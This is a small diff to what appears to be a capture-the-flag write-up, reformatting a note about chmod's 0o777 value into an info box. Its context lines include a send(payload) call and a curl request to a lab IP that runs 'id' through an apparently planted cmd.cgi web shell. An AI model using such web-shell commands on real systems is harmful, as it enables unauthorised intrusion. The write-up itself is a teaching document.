@@ -243,7 +243,9 @@ payload = '''
 send(payload)
 ```
 
-> Note: `0o777` in integer is `511` for chmod.
+::: info Note
+`0o777` in integer is `511` for chmod.
+:::
 
 ```powershell
 ➜ curl 'http://94.237.59.199:39532/cmd.cgi?id'
